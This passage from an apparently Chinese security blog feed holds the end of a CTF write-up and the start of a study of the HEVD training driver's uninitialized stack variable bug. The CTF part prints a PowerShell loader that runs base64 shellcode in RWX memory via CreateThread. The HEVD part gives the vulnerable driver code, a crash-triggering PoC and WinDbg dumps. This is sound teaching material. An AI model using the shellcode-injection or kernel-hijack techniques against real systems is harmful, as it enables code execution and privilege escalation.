class="keyword">if</span>(<span class="variable">$r</span> <span class="operator">-eq</span> <span class="number">0</span>)&#123;<span class="variable">$pr</span>=([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((gproc kernel32.dll VirtualAlloc),(gdelegate <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>]) ([<span class="type">UInt32</span>])))).Invoke(<span class="number">0</span>,<span class="variable">$sc32</span>.Length,<span class="number">0</span>x3000,<span class="number">0</span>x40);</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable">$pr</span> <span class="operator">-ne</span> <span class="number">0</span>)&#123;</span><br><span class="line">            <span class="variable">$memset</span>=([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((gproc msvcrt.dll memset),(gdelegate <span class="selector-tag">@</span>([<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>]))));</span><br><span class="line">            <span class="keyword">for</span> (<span class="variable">$i</span>=<span class="number">0</span>;<span class="variable">$i</span> <span class="operator">-le</span> (<span class="variable">$sc32</span>.Length<span class="literal">-1</span>);<span class="variable">$i</span>++) &#123;</span><br><span class="line">                <span class="variable">$memset</span>.Invoke((<span class="variable">$pr</span>+<span class="variable">$i</span>), <span class="variable">$sc32</span>[<span class="variable">$i</span>], <span class="number">1</span>)</span><br><span class="line">            &#125;;</span><br><span class="line">            ([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="type">UInt32</span>],[<span class="built_in">Int</span><span class="type">Ptr</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>])))).Invoke(<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$pr</span>,<span class="variable">$pr</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">            ([<span class="type">System.Runtime.InteropServices.Marshal</span>]::GetDelegateForFunctionPointer((gproc kernel32.dll CreateThread),(gdelegate <span class="selector-tag">@</span>([<span class="built_in">Int</span><span class="type">Ptr</span>],[<span class="type">UInt32</span>],[<span class="built_in">Byte</span>[]],[<span class="built_in">Byte</span>[]],[<span class="type">UInt32</span>],[<span class="built_in">Int</span><span class="type">Ptr</span>]) ([<span class="built_in">Int</span><span class="type">Ptr</span>])))).Invoke(<span class="number">0</span>,<span class="number">0</span>,<span class="variable">$sc32</span>,<span class="variable">$sc32</span>,<span class="number">0</span>,<span class="number">0</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    <span class="built_in">sleep</span>(<span class="number">1200</span>);</span><br><span class="line">    &#125;</span><br><span class="line"><span class="keyword">catch</span>&#123;</span><br><span class="line"></span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">exit</span>;</span><br></pre></td></tr></table></figure>

<p>分析可以得到，就是解码shellcode执行的。</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="built_in">set</span> l=<span class="number">2</span>eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JC%j:~<span class="number">1</span>,<span class="number">1</span>%<span class="number">14</span>YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+</span><br><span class="line"><span class="built_in">set</span> m=moAsSAMOY%<span class="number">02</span>maCkAOwBsdf%smadfdf9z///+qamogG8AZABSDGsaSSwhmzWMOYsA+/masdgmoKYqWTAGEAaQBuAC4ARAB//IAbA==</span><br><span class="line"><span class="built_in">set</span> n=LABNAmaodSDGASJOIHGI76msdm%<span class="built_in">ls</span>:<span class="number">1</span>qwerATSAYUDBGOSSnsAMIOLM//sogs+AuAFasgqQQYYHAFAZ2%:~QBtAGIAbABdABEA+</span><br><span class="line"><span class="built_in">set</span> o=JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////<span class="number">2</span>hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/<span class="number">9</span>AxwFD/VQg=</span><br></pre></td></tr></table></figure>

<p>同样适用echo的方法得到shellcode的部分</p>
<figure class="highlight powershell"><table><tr><td class="code"><pre><span class="line"><span class="number">2</span>eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////<span class="number">2</span>hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/<span class="number">9</span>AxwFD/VQg=</span><br></pre></td></tr></table></figure>

<figure class="highlight bash"><table><tr><td class="code"><pre><span class="line"><span class="comment"># muhe @ muheMBP in ~ [23:07:13]</span></span><br><span class="line">$ python</span><br><span class="line">Python 2.7.10 (default, Feb  7 2017, 00:08:15)</span><br><span class="line">[GCC 4.2.1 Compatible Apple LLVM 8.0.0 (clang-800.0.34)] on darwin</span><br><span class="line">Type <span class="string">&quot;help&quot;</span>, <span class="string">&quot;copyright&quot;</span>, <span class="string">&quot;credits&quot;</span> or <span class="string">&quot;license&quot;</span> <span class="keyword">for</span> more information.</span><br><span class="line">&gt;&gt;&gt; import base64</span><br><span class="line">&gt;&gt;&gt; base64.b64decode(<span class="string">&quot;2eub2XQk9DHSsncxyWSLcTCLdgyLdhyLRgiLfiCLNjhPGHXzWQHR/+Fgi2wkJItFPItUKHgB6otKGItaIAHr4zRJizSLAe4x/zHA/KyEwHQHwc8NAcfr9Dt8JCh14YtaJAHrZosMS4taHAHriwSLAeiJRCQcYcOyCCnUieWJwmiOTg7sUuif////iUUEu37Y4nOHHCRS6I7///+JRQhobGwgQWgzMi5kaHVzZXIw24hcJAqJ5lb/VQSJwlC7qKJNvIccJFLoX////2hyb1ggaGRNaWNoVHJlbjHbiFwkConjaCF9WCBoZ2FpbmhzTWVBaCFJdEloaGVyZWhsbG9UaEZ7SGVoVE1DVDHJiEwkHonhMdJSU1FS/9AxwFD/VQg=&quot;</span>)</span><br><span class="line"><span class="string">&#x27;\xd9\xeb\x9b\xd9t$\xf41\xd2\xb2w1\xc9d\x8bq0\x8bv\x0c\x8bv\x1c\x8bF\x08\x8b~ \x8b68O\x18u\xf3Y\x01\xd1\xff\xe1`\x8bl$$\x8bE&lt;\x8bT(x\x01\xea\x8bJ\x18\x8bZ \x01\xeb\xe34I\x8b4\x8b\x01\xee1\xff1\xc0\xfc\xac\x84\xc0t\x07\xc1\xcf\r\x01\xc7\xeb\xf4;|$(u\xe1\x8bZ$\x01\xebf\x8b\x0cK\x8bZ\x1c\x01\xeb\x8b\x04\x8b\x01\xe8\x89D$\x1ca\xc3\xb2\x08)\xd4\x89\xe5\x89\xc2h\x8eN\x0e\xecR\xe8\x9f\xff\xff\xff\x89E\x04\xbb~\xd8\xe2s\x87\x1c$R\xe8\x8e\xff\xff\xff\x89E\x08hll Ah32.dhuser0\xdb\x88\\$\n\x89\xe6V\xffU\x04\x89\xc2P\xbb\xa8\xa2M\xbc\x87\x1c$R\xe8_\xff\xff\xffhroX hdMichTren1\xdb\x88\\$\n\x89\xe3h!&#125;X hgainhsMeAh!ItIhherehlloThF&#123;HehTMCT1\xc9\x88L$\x1e\x89\xe11\xd2RSQR\xff\xd01\xc0P\xffU\x08&#x27;</span></span><br></pre></td></tr></table></figure>

<p>可以看到字符串…重定向到文件 strings一下就看到flag了。</p>
]]></content>
      <categories>
        <category>CTF</category>
      </categories>
      <tags>
        <tag>ctf</tag>
      </tags>
  </entry>
  <entry>
    <title>Windows-Kernel-Exploit-Study(3)</title>
    <url>/2017/02/04/Windows-Kernel-Exploit-Study-3/</url>
    <content><![CDATA[<h4 id="0x00"><a href="#0x00" class="headerlink" title="0x00:"></a>0x00:</h4><p>这是HEVD系列中关于栈上变量未初始化的一种利用，在kernel的exploit中，这种情况很少发生，作为一个demo可以体会一下对于这种漏洞的<code>Kernel stack spray</code>的利用方式。在UAF的漏洞中，我们常常使用<code>heap spray</code>的方式去利用，然而<code>Kernel stack spray</code>差不多，不过是提前把数据”喷射”到内核栈，占据未初始化的变量的位置，如果是一个函数指针，那么我们就可以劫持这个函数，调用，去执行shellcode，从而完成提权。</p>
<a id="more"></a>

<pre><code>关于环境及工具：</code></pre>
<ul>
<li>   windows7 cn x86</li>
<li>   windbg</li>
<li>   osrloader</li>
</ul>
<h4 id="0x01-先来看vuln代码"><a href="#0x01-先来看vuln代码" class="headerlink" title="0x01:先来看vuln代码"></a>0x01:先来看vuln代码</h4><figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"><span class="function">VOID <span class="title">UninitializedStackVariableObjectCallback</span><span class="params">()</span> </span>&#123;</span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    DbgPrint(<span class="string">&quot;[+] Uninitialized Stack Variable Object Callback\n&quot;</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/// &lt;summary&gt;</span></span><br><span class="line"><span class="comment">/// Trigger the Uninitialized Stack Variable Vulnerability</span></span><br><span class="line"><span class="comment">/// &lt;/summary&gt;</span></span><br><span class="line"><span class="comment">/// &lt;param name=&quot;UserBuffer&quot;&gt;The pointer to user mode buffer&lt;/param&gt;</span></span><br><span class="line"><span class="comment">/// &lt;returns&gt;NTSTATUS&lt;/returns&gt;</span></span><br><span class="line"><span class="function">NTSTATUS <span class="title">TriggerUninitializedStackVariable</span><span class="params">(IN PVOID UserBuffer)</span> </span>&#123;</span><br><span class="line">    ULONG UserValue = <span class="number">0</span>;</span><br><span class="line">    ULONG MagicValue = <span class="number">0xBAD0B0B0</span>;</span><br><span class="line">    NTSTATUS Status = STATUS_SUCCESS;</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifdef</span> SECURE</span></span><br><span class="line">    <span class="comment">// Secure Note: This is secure because the developer is properly initializing</span></span><br><span class="line">    <span class="comment">// UNINITIALIZED_STACK_VARIABLE to NULL and checks for NULL pointer before calling</span></span><br><span class="line">    <span class="comment">// the callback</span></span><br><span class="line">    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable = &#123;<span class="number">0</span>&#125;;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">else</span></span></span><br><span class="line">    <span class="comment">// Vulnerability Note: This is a vanilla Uninitialized Stack Variable vulnerability</span></span><br><span class="line">    <span class="comment">// because the developer is not initializing &#x27;UNINITIALIZED_STACK_VARIABLE&#x27; structure</span></span><br><span class="line">    <span class="comment">// before calling the callback when &#x27;MagicValue&#x27; does not match &#x27;UserValue&#x27;</span></span><br><span class="line">    UNINITIALIZED_STACK_VARIABLE UninitializedStackVariable;</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">    PAGED_CODE();</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line">        <span class="comment">// Verify if the buffer resides in user mode</span></span><br><span class="line">        ProbeForRead(UserBuffer,</span><br><span class="line">                     <span class="keyword">sizeof</span>(UNINITIALIZED_STACK_VARIABLE),</span><br><span class="line">                     (ULONG)__alignof(UNINITIALIZED_STACK_VARIABLE));</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Get the value from user mode</span></span><br><span class="line">        UserValue = *(PULONG)UserBuffer;</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UserValue: 0x%p\n&quot;</span>, UserValue);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UninitializedStackVariable Address: 0x%p\n&quot;</span>, &amp;UninitializedStackVariable);</span><br><span class="line"></span><br><span class="line">        <span class="comment">// Validate the magic value</span></span><br><span class="line">        <span class="comment">// 如果我们传递的UserValue和这个MagicVule相同才会走这里。</span></span><br><span class="line">        <span class="keyword">if</span> (UserValue == MagicValue) &#123;</span><br><span class="line">            UninitializedStackVariable.Value = UserValue;</span><br><span class="line">            UninitializedStackVariable.Callback = &amp;UninitializedStackVariableObjectCallback;</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UninitializedStackVariable.Value: 0x%p\n&quot;</span>, UninitializedStackVariable.Value);</span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] UninitializedStackVariable.Callback: 0x%p\n&quot;</span>, UninitializedStackVariable.Callback);</span><br><span class="line"></span><br><span class="line"><span class="meta">#<span class="meta-keyword">ifndef</span> SECURE</span></span><br><span class="line">        DbgPrint(<span class="string">&quot;[+] Triggering Uninitialized Stack Variable Vulnerability\n&quot;</span>);</span><br><span class="line"><span class="meta">#<span class="meta-keyword">endif</span></span></span><br><span class="line"></span><br><span class="line">        <span class="comment">// Call the callback function</span></span><br><span class="line">        <span class="comment">//如果前面UserValue和MageValue不一样的时候，callback没被赋值的，直接调用就会出问题。</span></span><br><span class="line">        <span class="keyword">if</span> (UninitializedStackVariable.Callback) &#123;</span><br><span class="line">            UninitializedStackVariable.Callback();</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        Status = GetExceptionCode();</span><br><span class="line">        DbgPrint(<span class="string">&quot;[-] Exception Code: 0x%X\n&quot;</span>, Status);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> Status;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>我们传递一个非<code>MagicValue</code>的值，<code>UninitializedStackVariable.Callback</code>就是一个未定的值，后面直接调用，就可能会直接崩溃。</p>
<h4 id="0x02-调试"><a href="#0x02-调试" class="headerlink" title="0x02:调试"></a>0x02:调试</h4><p>设置好win7 kernel调试相关的设置，挂载上驱动。<br>PoC代码如下</p>
<figure class="highlight cpp"><table><tr><td class="code"><pre><span class="line"></span><br><span class="line"><span class="function">HANDLE <span class="title">GetDeviceHandle</span><span class="params">(LPCSTR DeviceName)</span></span>&#123;</span><br><span class="line"></span><br><span class="line">    HANDLE hDriver = CreateFileA(DeviceName,</span><br><span class="line">            GENERIC_READ | GENERIC_WRITE,</span><br><span class="line">            FILE_SHARE_READ | FILE_SHARE_WRITE,</span><br><span class="line">            <span class="literal">NULL</span>,</span><br><span class="line">            OPEN_EXISTING,</span><br><span class="line">            FILE_ATTRIBUTE_NORMAL | FILE_FLAG_OVERLAPPED,</span><br><span class="line">            <span class="literal">NULL</span>);</span><br><span class="line">    <span class="keyword">return</span> hDriver;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="keyword">int</span> _tmain(<span class="keyword">int</span> argc, _TCHAR* argv[]) &#123;</span><br><span class="line">    ULONG BytesReturned;</span><br><span class="line">    HANDLE hFile = <span class="literal">NULL</span>;</span><br><span class="line">    ULONG MagicValue = <span class="number">0xBAADF00D</span>;</span><br><span class="line">    LPCSTR lpDeviceName = (LPCSTR)<span class="string">&quot;\\\\.\\HackSysExtremeVulnerableDriver&quot;</span>;</span><br><span class="line"></span><br><span class="line">    __try &#123;</span><br><span class="line"></span><br><span class="line">        hFile = GetDeviceHandle(lpDeviceName);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">if</span> (hFile == INVALID_HANDLE_VALUE) &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\t\t[-] Failed Getting Device Handle: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">            <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">else</span> &#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;\t\t[+] Device Handle: 0x%X\n&quot;</span>, hFile);</span><br><span class="line">        &#125;</span><br><span class="line">        StackSprayBuffer = (PULONG)HeapAlloc(GetProcessHeap(),HEAP_ZERO_MEMORY,StackSprayBufferSize);</span><br><span class="line">        <span class="keyword">if</span>(!StackSprayBuffer)&#123;</span><br><span class="line">            <span class="built_in">printf</span>(<span class="string">&quot;Alloc buffer error : 0x%X&quot;</span>,GetLastError());</span><br><span class="line">        &#125;</span><br><span class="line"></span><br><span class="line">        DeviceIoControl(hFile,</span><br><span class="line">                        HACKSYS_EVD_IOCTL_UNINITIALIZED_STACK_VARIABLE,</span><br><span class="line">                        (LPVOID)&amp;MagicValue,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        <span class="literal">NULL</span>,</span><br><span class="line">                        <span class="number">0</span>,</span><br><span class="line">                        &amp;BytesReturned,</span><br><span class="line">                        <span class="literal">NULL</span>);</span><br><span class="line"></span><br><span class="line">        HeapFree(GetProcessHeap(),<span class="number">0</span>,(LPVOID)StackSprayBuffer);</span><br><span class="line">        <span class="comment">//set ptr NULL</span></span><br><span class="line">        StackSprayBuffer = <span class="literal">NULL</span>;</span><br><span class="line">    &#125;</span><br><span class="line">    __except (EXCEPTION_EXECUTE_HANDLER) &#123;</span><br><span class="line">        <span class="built_in">printf</span>(<span class="string">&quot;\t\t[-] Exception: 0x%X\n&quot;</span>, GetLastError());</span><br><span class="line">        <span class="built_in">exit</span>(EXIT_FAILURE);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
<p>Windbg设置后</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">!gflag +soe</span><br></pre></td></tr></table></figure>
<p>为了调试到触发vuln的部分的代码，采用的方式是结合IDA，查看函数的offset，结合HEVD模块的加载基地址，去下断点，断在有漏洞的函数那里。</p>
<p>之后捕获到crash</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !gflag +soe</span><br><span class="line">New NtGlobalFlag contents: 0x00000001</span><br><span class="line">    soe - Stop On Exception</span><br><span class="line">kd&gt; g</span><br><span class="line">Access violation - code c0000005 (first chance)</span><br><span class="line">First chance exceptions are reported before any exception handling.</span><br><span class="line">This exception may be expected and handled.</span><br><span class="line">00000000 ??              ???</span><br><span class="line">kd&gt; dps esp</span><br><span class="line">9adb9ab0  75abe00b</span><br><span class="line">9adb9ab4  8eff4f94*** ERROR: Module load completed but symbols could not be loaded for HEVD.sys</span><br><span class="line"> HEVD+0x4f94</span><br><span class="line">9adb9ab8  1424bcc8</span><br><span class="line">9adb9abc  87c86980</span><br><span class="line">9adb9ac0  87c869f0</span><br><span class="line">9adb9ac4  8eff5ca4 HEVD+0x5ca4</span><br><span class="line">9adb9ac8  83ec88c8 nt!MiExchangeWsle+0x7c</span><br><span class="line">9adb9acc  75abe005</span><br><span class="line">9adb9ad0  0000014f</span><br><span class="line">9adb9ad4  00000000 ----&gt; CallBack函数</span><br><span class="line">9adb9ad8  c080327c</span><br><span class="line">9adb9adc  00433009</span><br><span class="line">9adb9ae0  00000001</span><br><span class="line">9adb9ae4  0000015d</span><br><span class="line">9adb9ae8  9adb9b14</span><br><span class="line">9adb9aec  83ec8a26 nt!MiSwapWslEntries+0x14c</span><br><span class="line">9adb9af0  00433009</span><br><span class="line">9adb9af4  0000014f</span><br><span class="line">9adb9af8  75abe001</span><br><span class="line">9adb9afc  0000014f</span><br><span class="line">9adb9b00  c0802000</span><br><span class="line">9adb9b04  85da5928</span><br><span class="line">9adb9b08  00000001</span><br><span class="line">9adb9b0c  00000059</span><br><span class="line">9adb9b10  00000000</span><br><span class="line">9adb9b14  9adb9b40</span><br><span class="line">9adb9b18  83ec6397 nt!MiUpdateWsle+0x12d</span><br><span class="line">9adb9b1c  0000014f</span><br><span class="line">9adb9b20  0000015d</span><br><span class="line">9adb9b24  85d6d6c0</span><br><span class="line">9adb9b28  0000015d</span><br><span class="line">9adb9b2c  85d6d6c0</span><br></pre></td></tr></table></figure>

<p>可以看到调用了 0x00000000，然而这个地址是个非法地址，所以crash。挺奇怪的是这个时候g命令还可以继续走…所以我又跑了一次PoC。<br>我第二次运行PoC获得的信息如下：</p>
<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">kd&gt; !analyze -v</span><br><span class="line">*******************************************************************************</span><br><span class="line">*                                                                             *</span><br><span class="line">*                        Bugcheck Analysis                                    *</span><br><span class="line">*                                                                             *</span><br><span class="line">*******************************************************************************</span><br><span class="line"></span><br><span class="line">PAGE_FAULT_IN_NONPAGED_AREA (50)</span><br><span class="line">Invalid system memory was referenced.  This cannot be protected by try-except.</span><br><span class="line">Typically the address is just plain bad or it is pointing at freed memory.</span><br><span class="line">Arguments:</span><br><span class="line">Arg1: ffffffdd, memory referenced.</span><br><span class="line">Arg2: 00000001, value 0 &#x3D; read operation, 1 &#x3D; write operation.</span><br><span class="line">Arg3: 59477005, If non-zero, the instruction address which referenced the bad memory</span><br><span class="line">    address.</span><br><span class="line">Arg4: 00000000, (reserved)</span><br><span class="line"></span><br><span class="line">Debugging Details:</span><br><span class="line">------------------</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">DUMP_CLASS: 1</span><br><span class="line"></span><br><span class="line">DUMP_QUALIFIER: 0</span><br><span class="line"></span><br><span class="line">BUILD_VERSION_STRING:  6.1.7600.16385 (win7_rtm.090713-1255)</span><br><span class="line"></span><br><span class="line">DUMP_TYPE:  0</span><br><span class="line"></span><br><span class="line">BUGCHECK_P1: ffffffffffffffdd</span><br><span class="line"></span><br><span class="line">BUGCHECK_P2: 1</span><br><span class="line"></span><br><span class="line">BUGCHECK_P3: 59477005</span><br><span class="line"></span><br><span class="line">BUGCHECK_P4: 0</span><br><span class="line"></span><br><span class="line">WRITE_ADDRESS:  ffffffdd </span><br><span class="line"></span><br><span class="line">FAULTING_IP: </span><br><span class="line">MSVCR110D!_ioinitCallback+1e5</span><br><span class="line">59477005 0068dd          add     byte ptr [eax-23h],ch</span><br><span class="line"></span><br><span class="line">MM_INTERNAL_CODE:  0</span><br><span class="line"></span><br><span class="line">CPU_COUNT: 1</span><br><span class="line"></span><br><span class="line">CPU_MHZ: af1</span><br><span class="line"></span><br><span class="line">CPU_VENDOR:  GenuineIntel</span><br><span class="line"></span><br><span class="line">CPU_FAMILY: 6</span><br><span class="line"></span><br><span class="line">CPU_MODEL: 3c</span><br><span class="line"></span><br><span class="line">CPU_STEPPING: 3</span><br><span class="line"></span><br><span class="line">CPU_MICROCODE: 6,3c,3,0 (F,M,S,R)  SIG: 1E&#39;00000000 (cache) 1E&#39;00000000 (init)</span><br><span class="line"></span><br><span class="line">DEFAULT_BUCKET_ID:  WIN7_DRIVER_FAULT</span><br><span class="line"></span><br><span class="line">BUGCHECK_STR:  0x50</span><br><span class="line"></span><br><span class="line">PROCESS_NAME:  test.exe</span><br><span class="line"></span><br><span class="line">CURRENT_IRQL:  2</span><br><span class="line"></span><br><span class="line">ANALYSIS_SESSION_HOST:  MUHE-PC</span><br><span class="line"></span><br><span class="line">ANALYSIS_SESSION_TIME:  02-04-2017 19:46:44.0573</span><br><span class="line"></span><br><span class="line">ANALYSIS_VERSION: 10.0.14321.1024 x86fre</span><br><span class="line"></span><br><span class="line">TRAP_FRAME:  8d47ea40 -- (.trap 0xffffffff8d47ea40)</span><br><span class="line">ErrCode &#x3D; 00000002</span><br><span class="line">eax&#x3D;00000000 ebx&#x3D;94f53ca4 ecx&#x3D;0024f9f0 edx&#x3D;00000065 esi&#x3D;baadf00d edi&#x3D;00000000</span><br><span class="line">eip&#x3D;59477005 esp&#x3D;8d47eab4 ebp&#x3D;8d47ebd4 iopl&#x3D;0         nv up ei pl nz na pe nc</span><br><span class="line">cs&#x3D;0008  ss&#x3D;0010  ds&#x3D;0023  es&#x3D;0023  fs&#x3D;0030  gs&#x3D;0000             efl&#x3D;00010206</span><br><span class="line">MSVCR110D!_ioinitCallback+0x1e5:</span><br><span class="line">59477005 0068dd          add     byte ptr [eax-23h],ch      ds:0023:ffffffdd&#x3D;??</span><br><span class="line">Resetting default scope</span><br><span class="line"></span><br><span class="line">MISALIGNED_IP: </span><br><span class="line">MSVCR110D!_ioinitCallback+1e5</span><br><span class="line">59477005 0068dd          add     byte ptr [eax-23h],ch</span><br><span class="line"></span><br><span class="line">LAST_CONTROL_TRANSFER:  from 83ee5e71 to 83e74394</span><br><span class="line"></span><br><span class="line">STACK_TEXT:  </span><br><span class="line">8d47e58c 83ee5e71 00000003 dbca9caa 00000065 nt!RtlpBreakWithStatusInstruction</span><br><span class="line">8d47e5dc 83ee696d 00000003 86557030 00000000 nt!KiBugCheckDebugBreak+0x1c</span><br><span class="line">8d47e9a0 83e8e8e3 00000050 ffffffdd 00000001 nt!KeBugCheck2+0x68b</span><br><span class="line">8d47ea28 83e4f5f8 00000001 ffffffdd 00000000 nt!MmAccessFault+0x106</span><br><span class="line">8d47ea28 59477005 00000001 ffffffdd 00000000 nt!KiTrap0E+0xdc</span><br><span class="line">8d47ebd4 94f52fe8 0024f9f0 8d47ebfc 94f53219 MSVCR110D!_ioinitCallback+0x1e5</span><br><span class="line">WARNING: Stack unwind information not available. Following frames may be wrong.</span><br><span class="line">8d47ebe0 94f53219 878eb928 878eb998 85d8bf80 HEVD+0x4fe8</span><br><span class="line">8d47ebfc 83e454bc 878bbbb0 878eb928 878eb928 HEVD+0x5219</span><br><span class="line">8d47ec14 84046eee 85d8bf80 878eb928 878eb998 nt!IofCallDriver+0x63</span><br><span class="line">8d47ec34 84063cd1 878bbbb0 85d8bf80 00000000 nt!IopSynchronousServiceTail+0x1f8</span><br><span class="line">8d47ecd0 840664ac 878bbbb0 878eb928 00000000 nt!IopXxxControlFile+0x6aa</span><br><span class="line">8d47ed04 83e4c42a 0000001c 00000000 00000000 nt!NtDeviceIoControlFile+0x2a</span><br><span class="line">8d47ed04 76e464f4 0000001c 00000000 00000000 nt!KiFastCallEntry+0x12a</span><br><span class="line">0024f828 76e44cac 74fda08f 0000001c 00000000 ntdll!KiFastSystemCallRet</span><br><span class="line">0024f82c 74fda08f 0000001c 00000000 00000000 ntdll!ZwDeviceIoControlFile+0xc</span><br><span class="line">0024f88c 76c0ec25 0000001c 0022202f 0024f9f0 KERNELBASE!DeviceIoControl+0xf6</span><br><span class="line">0024f8b8 013e1612 0000001c 0022202f 0024f9f0 kernel32!DeviceIoControlImplementation+0x80</span><br><span class="line">0024fa34 013e1cc9 00000001 00350598 00351ba8 test+0x11612</span><br><span class="line">0024fa84 013e1ebd 0024fa98 76c11174 7ffd4000 test+0x11cc9</span><br><span class="line">0024fa8c 76c11174 7ffd4000 0024fad8 76e5b3f5 test+0x11ebd</span><br><span class="line">0024fa98 76e5b3f5 7ffd4000 76c02850 00000000 kernel32!BaseThreadInitThunk+0xe</span><br><span class="line">0024fad8 76e5b3c8 013e1082 7ffd4000 00000000 ntdll!__RtlUserThreadStart+0x70</span><br><span class="line">0024faf0 00000000 013e1082 7ffd4000 00000000 ntdll!_RtlUserThreadStart+0x1b</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">STACK_COMMAND:  kb</span><br><span class="line"></span><br><span class="line">THREAD_SHA1_HASH_MOD_FUNC:  b2a297aada69e6279fdc3daae6f4a22cf686509a</span><br><span class="line"></span><br><span class="line">THREAD_SHA1_HASH_MOD_FUNC_OFFSET:  4f005ee17e97a074c7da84fec24b29c43a55219c</span><br><span class="line"></span><br><span class="line">THREAD_SHA1_HASH_MOD:  c3a8502bd33e9f58cfa688b5c9397c7eefe7acfa</span><br><span class="line"></span><br><span class="line">FOLLOWUP_IP: </span><br><span class="line">HEVD+4fe8</span><br><span class="line">94f52fe8 5d              pop     ebp</span><br><span class="line"></span><br><span class="line">FAULT_INSTR_CODE:  8c25d</span><br><span class="line"></span><br><span class="line">SYMBOL_STACK_INDEX:  6</span><br><span class="line"></span><br><span class="line">SYMBOL_NAME:  HEVD+4fe8</span><br><span class="line"></span><br><span class="line">FOLLOWUP_NAME:  MachineOwner</span><br><span class="line"></span><br><span class="line">IMAGE_NAME:  hardware</span><br><span class="line"></span><br><span class="line">DEBUG_FLR_IMAGE_TIMESTAMP:  0</span><br><span class="line"></span><br><span class="line">MODULE_NAME: hardware</span><br><span class="line"></span><br><span class="line">FAILURE_BUCKET_ID:  IP_MISALIGNED</span><br><span class="line"></span><br><span class="line">BUCKET_ID:  IP_MISALIGNED</span><br><span class="line"></span><br><span class="line">PRIMARY_PROBLEM_CLASS:  IP_MISALIGNED</span><br><span class="line"></span><br><span class="line">TARGET_TIME:  2017-02-04T11:45:48.000Z</span><br><span class="line"></span><br><span class="line">OSBUILD:  7600</span><br><span class="line"></span><br><span class="line">OSSERVICEPACK:  16385</span><br><span class="line"></span><br><span class="line">SERVICEPACK_NUMBER: 0</span><br><span class="line"></span><br><span class="line">OS_REVISION: 0</span><br><span class="line"></span><br><span class="line">SUITE_MASK:  272</span><br><span 